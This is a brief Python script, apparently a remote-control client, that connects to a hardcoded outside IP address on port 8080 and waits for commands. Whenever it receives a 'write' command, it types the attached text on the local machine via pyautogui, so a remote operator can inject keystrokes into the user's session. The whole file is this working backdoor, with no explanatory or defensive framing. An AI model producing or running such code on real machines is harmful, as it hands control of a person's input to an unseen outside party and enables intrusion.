import socket
import pyautogui
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = ('94.190.12.250', 8080)
sock.connect(server_address)
sock.sendall(b"connected!")
try:
    while True:
        data = sock.recv(1024)
        if data:
            data = data.decode("utf-8").split("|")
            if data[0] == "write":
                pyautogui.write(data[1])
except ImportError:
    pass